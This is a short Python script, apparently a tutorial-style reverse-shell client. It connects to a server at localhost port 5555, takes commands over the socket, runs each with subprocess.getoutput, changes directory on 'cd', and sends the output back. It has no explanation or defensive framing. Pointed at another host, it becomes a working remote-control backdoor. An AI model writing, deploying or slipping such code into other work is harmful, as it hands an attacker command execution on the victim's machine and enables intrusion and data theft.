import socket
import subprocess
import os

SERVER_HOST = "localhost"
SERVER_PORT = 5555
BUFFER_SIZE = 1024

s = socket.socket()
s.connect((SERVER_HOST,SERVER_PORT))

message = s.recv(BUFFER_SIZE).decode()
print("Server: ", message)

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    elif command.lower()[:2] == "cd":
        os.chdir(command[3:])
    output = subprocess.getoutput(command)
    s.send(output.encode())
s.close